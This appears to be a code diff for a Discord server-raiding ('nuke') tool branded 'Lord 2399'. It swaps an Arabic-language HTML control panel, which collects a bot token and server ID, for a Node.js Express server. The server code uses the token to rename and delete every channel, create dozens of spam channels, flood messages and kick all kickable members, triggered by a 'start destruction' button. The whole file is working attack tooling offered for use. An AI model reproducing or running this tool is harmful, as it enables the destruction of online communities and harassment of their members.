@@ -1,141 +1,68 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LORD 2399 PANEL</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Cairo:wght@600;900&display=swap');
-        
-        body { margin: 0; background: #000; color: #fff; font-family: 'Cairo', sans-serif; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        
-        /* ضبط الفيديو ليكون على مقاس الشاشة بالتمام بدون قص مخل */
-        #video-bg {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            z-index: -2;
-            object-fit: cover; /* يغطي الشاشة مع الحفاظ على التناسب */
+const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
+const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+
+const app = express();
+app.use(cors());
+app.use(bodyParser.json());
+
+app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
+
+app.post('/execute', async (req, res) => {
+    const { token, guildId, action, customName, customMsg } = req.body;
+    const client = new Client({ intents: [3276799] });
+
+    try {
+        await client.login(token);
+        const guild = await client.guilds.fetch(guildId);
+        if (!guild) throw new Error("Server not found");
+
+        const name = customName || "Group 2399";
+        const msg = customMsg || "# Group 2399 is here";
+
+        if (action === 'تغيير الأسماء') {
+            guild.channels.cache.forEach(c => c.setName(name).catch(() => {}));
         }
 
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.2); /* تعتيم خفيف جداً */
-            z-index: -1;
+        if (action === 'إنشاء رومات') {
+            // إنشاء 60 روم بتوقيت بسيط لمنع التعليق
+            for (let i = 0; i < 60; i++) {
+                setTimeout(() => {
+                    guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => {});
+                }, i * 200); 
+            }
         }
 
-        /* لوحة التحكم: شفافة جداً عشان المقطع يوضح */
-        .card { 
-            width: 85%; 
-            max-width: 350px; 
-            background: rgba(0, 0, 0, 0.4); /* شفافة جداً */
-            border: 1.5px solid rgba(255, 0, 0, 0.6); 
-            border-radius: 20px; 
-            padding: 20px; 
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5); 
-            text-align: center; 
-            backdrop-filter: blur(2px); /* ضبابية خفيفة جداً */
-            -webkit-backdrop-filter: blur(2px);
+        if (action === 'إرسال سبام') {
+            const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
+            channels.forEach(ch => {
+                for (let i = 0; i < 50; i++) { // خففتها لـ 50 لضمان عدم التعليق
+                    setTimeout(() => ch.send(msg).catch(() => {}), i * 500);
+                }
+            });
         }
 
-        h1 { font-family: 'Orbitron'; color: #f00; text-shadow: 0 0 15px #f00; font-size: 24px; margin-bottom: 15px; }
-        
-        input, textarea { width: 100%; padding: 10px; margin: 6px 0; background: rgba(0,0,0,0.6); border: 1px solid #444; color: #fff; border-radius: 10px; font-size: 13px; outline: none; }
-        
-        .btn { width: 100%; padding: 12px; background: rgba(255, 0, 0, 0.75); color: #fff; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; margin-top: 8px; }
-        
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
-        
-        .btn-small { background: rgba(17, 17, 17, 0.6); border: 1px solid #f00; padding: 10px; font-size: 11px; color: white; border-radius: 8px; }
-        
-        .pledge-box { background: rgba(0,0,0,0.5); padding: 12px; border-radius: 12px; border: 1px dashed rgba(255,0,0,0.5); font-size: 12px; }
-
-        .hidden { display: none; }
-        .footer-info { font-size: 10px; color: #eee; margin-top: 15px; font-family: 'Orbitron'; text-shadow: 1px 1px 2px #000; }
-        
-        /* إخفاء شريط التمرير */
-        ::-webkit-scrollbar { display: none; }
-    </style>
-</head>
-<body>
-
-    <!-- الفيديو بوضع الملء الكامل المناسب للجوال -->
-    <video autoplay loop muted playsinline id="video-bg">
-        <source src="https://a.top4top.io/m_3745ydpjj9.mp4" type="video/mp4">
-    </video>
-    <div class="overlay"></div>
-
-    <!-- كود الخطوات (التعهد، الدخول، اللوحة) كما هو بالسابق مع التنسيق الشفاف -->
-    <div id="step0" class="card">
-        <h1>2399 SYSTEM</h1>
-        <div class="pledge-box">
-            <p style="margin-top:0">ادخل سيرفر ديسكورد الرسمي</p>
-            <a href="https://discord.gg/2399k" style="color:#5865f2; text-decoration:none; font-weight:bold" target="_blank">اضغط هنا للدخول</a>
-            <hr style="border-color:#333; margin:10px 0">
-            <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; font-size:11px">
-                <input type="checkbox" id="pledgeCheck" style="width: 16px; height: 16px;">
-                <span>أتعهد بالدخول وأبرئ ذمة Lord 2399</span>
-            </label>
-        </div>
-        <button class="btn" onclick="goToLogin()">الموافقة والدخول</button>
-    </div>
-
-    <div id="step1" class="card hidden">
-        <h1>LOGIN</h1>
-        <input type="password" id="tk" placeholder="BOT TOKEN">
-        <input type="text" id="id" placeholder="SERVER ID">
-        <button class="btn" onclick="goToPanel()">INITIALIZE</button>
-    </div>
-
-    <div id="step2" class="card hidden" style="max-height: 85vh; overflow-y: auto;">
-        <h1>LORD CONTROL</h1>
-        <input type="text" id="customName" placeholder="اسم الرومات">
-        <div class="grid">
-            <button class="btn-small" onclick="run('تغيير الأسماء')">تغيير الأسماء</button>
-            <button class="btn-small" onclick="run('إنشاء رومات')">إنشاء 60 روم</button>
-        </div>
-        <textarea id="customMsg" placeholder="رسالة السبام" rows="2"></textarea>
-        <button class="btn-small" style="width:100%" onclick="run('إرسال سبام')">إرسال 100 رسالة</button>
-        <button class="btn-small" style="width:100%; background: rgba(50, 0, 0, 0.6); margin-top:8px;" onclick="run('طرد الجميع')">طرد الجميع 👤</button>
-        <button class="btn" style="background: linear-gradient(90deg, rgba(150,0,0,0.8), rgba(255,0,0,0.8));" onclick="run('ابدأ')">ابدأ التدمير 💀</button>
-        <div class="footer-info">Lord 2399 | Discord: l07d</div>
-    </div>
-
-    <script>
-        function goToLogin() {
-            if(!document.getElementById('pledgeCheck').checked) return alert("وافق أولاً!");
-            document.getElementById('step0').classList.add('hidden');
-            document.getElementById('step1').classList.remove('hidden');
+        if (action === 'ابدأ' || action === 'ابدأ التدمير 💀') {
+            const members = await guild.members.fetch();
+            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
+            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
+            
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    guild.channels.create({ name: name, type: ChannelType.GuildText })
+                    .then(ch => {
+                        for(let j=0; j<20; j++) ch.send(msg).catch(() => {});
+                    }).catch(() => {});
+                }, i * 300);
+            }
         }
-        function goToPanel() {
-            if(!document.getElementById('tk').value || !document.getElementById('id').value) return alert("أدخل البيانات!");
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-        }
-        async function run(a) {
-            const tk = document.getElementById('tk').value;
-            const id = document.getElementById('id').value;
-            const name = document.getElementById('customName').value;
-            const msg = document.getElementById('customMsg').value;
-            try {
-                const res = await fetch('/execute', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({token: tk, guildId: id, action: a, customName: name, customMsg: msg})
-                });
-                const d = await res.json();
-                alert(d.status);
-            } catch (e) { alert("خطأ في الاتصال!"); }
-        }
-    </script>
-</body>
-</html>
+
+        res.send({ status: '🚀 العملية انطلقت بنجاح يا لورد!' });
+    } catch (e) {
+        console.error(e);
+        res.status(500).send({ status: '❌ خطأ: التوكن غلط أو تم حظرك مؤقتاً' });
+    }
+});
+
+app.listen(process.env.PORT || 3000);
